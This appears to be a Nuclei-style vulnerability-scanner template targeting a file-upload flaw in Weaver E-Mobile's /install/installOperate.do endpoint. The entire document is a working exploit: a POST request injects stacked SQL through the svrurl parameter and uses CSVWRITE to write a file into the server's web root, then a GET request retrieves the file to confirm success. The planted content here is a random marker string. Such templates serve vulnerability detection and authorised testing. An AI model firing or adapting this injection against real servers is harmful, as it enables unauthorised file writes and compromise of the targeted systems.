id: weaver-emobile-installOperate-fileupload
info:
  name: 泛微 E-Mobile-installOperate-文件上传
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-E-Mobile6-installOperate-upload.yaml
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips:
    repair:
    version:
  tags: weaver,emobile,fileupload,oa

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /install/installOperate.do  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        svrurl=http://127.0.0.1'%3bCREATE+TABLE+g1k3(NAME+VARCHAR)%3bINSERT+INTO+g1k3+VALUES('{{randstr}}')%3bCALL+CSVWRITE('webapps/ROOT/images/manager/{{filename}}.txt',+concat('se','LECT+*+FROM+g1k3'))%3b'
      
      - |+
        GET /images/manager/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_2 == 200 
          - contains(body_2,'{{randstr}}')
        condition: and